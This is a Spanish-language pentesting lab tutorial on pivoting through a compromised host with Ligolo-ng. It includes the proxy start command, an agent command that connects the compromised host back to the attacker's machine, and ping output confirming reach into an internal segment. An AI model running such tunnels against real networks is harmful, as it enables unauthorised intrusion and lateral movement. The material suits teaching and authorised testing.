# ¿Qué es un pivote?
Un pivote (Pivot Host) es un equipo que sirve como intermediario para acceder a otros sistemas o segmentos de red que no son directamente accesibles desde nuestra máquina de ataque.

# ¿Qué es la tunelización?
La tunelización (Tunneling) es una técnica que permite encapsular y transportar tráfico de red a través de otra conexión, creando un canal de comunicación entre dos puntos.
En pentesting, permite establecer conexiones hacia redes internas utilizando un equipo intermediario, incluso cuando esas redes no son directamente accesibles desde nuestra máquina de ataque.

# Ejecución

Luego de obtener acceso al host comprometido mediante distintas **TTPs (Tácticas, Técnicas y Procedimientos)**, procederemos a preparar nuestro equipo pivote para establecer un túnel hacia la red interna.

Para este escenario utilizaremos **Ligolo-ng**, una herramienta ampliamente utilizada en operaciones de Red Team por su versatilidad y facilidad de implementación. Aunque existen alternativas como **Chisel**, recomiendo Ligolo-ng por su capacidad para crear túneles de red mediante interfaces TUN, facilitando el acceso y la interacción con segmentos internos.

### Herramienta: Ligolo-ng

| Característica | Descripción |
|---|---|
| Tipo | Herramienta de tunneling y pivoting. |
| Arquitectura | Cliente-servidor. |
| Funcionamiento | Establece túneles de comunicación entre el atacante y el host pivote. |
| Interfaz de red | Utiliza interfaces TUN para enrutar tráfico. |
| Protocolo | TCP/TLS. |
| Uso principal | Acceso y enumeración de redes internas. |
| Alternativas | Chisel, SSH Tunneling y Proxychains. |

### 01. Enumeración e Identificación de interfaces de red

Ejecutamos `ip a` en el host `PIVOTE1` para identificar sus interfaces, direcciones IP y las redes a las que tiene conectividad.

| Interfaz | Dirección IP  | Red           | Función                             |
| -------- | ------------- | ------------- | ----------------------------------- |
| enp0s3   | 10.10.10.3/24 | 10.10.10.0/24 | Segmento de laboratorio             |
| enp0s8   | 20.20.20.3/24 | 20.20.20.0/24 | Segmento interno                    |
| enp0s9   | 10.0.0.53/24  | 10.0.0.0/24   | Red accesible desde nuestra máquina |

Este resultado nos indica que `PIVOTE1` cuenta con tres interfaces de red, lo que significa que tiene conectividad con tres segmentos diferentes. **Nuestro objetivo en este escenario es sencillo: acceder al segmento de red 20.20.20.0/24 a través del host pivote.**

### 02. Preparación del servidor Proxy

Con nuestra máquina de ataque identificada como punto de control, iniciaremos el servidor Proxy de Ligolo-ng. Este será el extremo receptor del túnel al que se conectará nuestro host pivote.

Ejecuta:

```bash
./proxy -selfcert
```

```Dato interesante```; El parámetro -selfcert me permite generar y utilizar un certificado TLS autofirmado para establecer una comunicación cifrada entre el Proxy y el Cliente.

### 03. En el host PIVOTE1

Tienes que conectar tu archivo cliente (Agent) al servidor Proxy que dejamos ejecutándose en nuestra máquina de ataque. 

Ejecuta: 

```bash
./Agent -connect 192.168.0.222:11601 -ignore-cert 
```

```Dato interesante```; El parámetro -ignote-cert omite la validación del certificado TLS del servidor 


### 04. Verificación de conectividad hacia PIVOTE2

Al hacer PING, hemos tenido exito:

```
PING 20.20.20.3 (20.20.20.3) 56(84) bytes of data.
64 bytes from 20.20.20.3: icmp_seq=1 ttl=64 time=1.24 ms
64 bytes from 20.20.20.3: icmp_seq=2 ttl=64 time=0.98 ms
64 bytes from 20.20.20.3: icmp_seq=3 ttl=64 time=1.12 ms
64 bytes from 20.20.20.3: icmp_seq=4 ttl=64 time=1.05 ms
```
Una vez establecido el túnel, debemos verificar desde nuestra máquina de ataque que podemos alcanzar la dirección 20.20.20.3 a través de la conectividad proporcionada por Ligolo-ng.

Esta dirección corresponde a nuestra máquina objetivo para practicar movimiento lateral. Básicamente, utilizamos ```PIVOTE1``` como intermediario para alcanzar un segundo equipo al que no teníamos acceso directo ```PIVOTE2```. En otras palabras, convertimos la primera máquina en un trampolín para llegar a la siguiente.


## H4ck the planet, Joseph <3



